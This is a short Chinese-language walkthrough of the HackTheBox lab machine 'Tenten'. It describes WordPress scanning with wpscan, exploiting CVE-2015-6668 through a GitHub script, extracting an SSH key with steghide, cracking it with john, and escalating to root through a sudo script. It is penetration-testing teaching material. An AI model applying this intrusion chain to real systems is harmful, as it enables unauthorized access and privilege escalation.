<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用whatweb识别站点指纹，目标为WordPress</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215132915851.png" class="" title="whatweb">

<p>点开文章，获得一个用户名(takis)，备用</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151109164.png" class="" title="信息收集">

<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>根据获取到的指纹，使用wpscan进行扫描，新版wpscan 要想获得漏洞信息，需要在官网注册账号，然后指定apk-token</p>
<pre class="language-none"><code class="language-none">wpscan  --url tenten.htb  --api-token WRH0ACCYJIBtqTKdxxxxxxxxxxLy1ZWzsAcxa8fA3s4</code></pre>

<img src="/Hackthebox/htb/htb-tenten/image-20250215144154195.png" class="" title="漏洞扫描">

<p>通过Fuzz 可以找到一个<code>/index.php/jobs/apply/13/</code>页面获取到标题</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215143621824.png" class="" title="信息收集">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在github可以找到一个CVE-2015-6668的Python2脚本，需要将脚本语法改成Python3</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215144333970.png" class="" title="漏洞利用">

<p>这张图片被隐写了信息，可以使用<code>steghide</code> 进行提取</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215145349051.png" class="" title="提取信息">

<p>使用<code>john</code>进行密码破解</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151629727.png" class="" title="破解密码">

<p>修改 <code>id_rsa</code> 权限，然后使用最开始收集到的用户名和破解出来的密码进行ssh 登录</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151534084.png" class="" title="Getshell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo -l 发现一个脚本，直接运行脚本即可提权</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215152404422.png" class="" title="信息收集">

<img src="/Hackthebox/htb/htb-tenten/image-20250215152228863.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td>&#x2F;home&#x2F;takis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
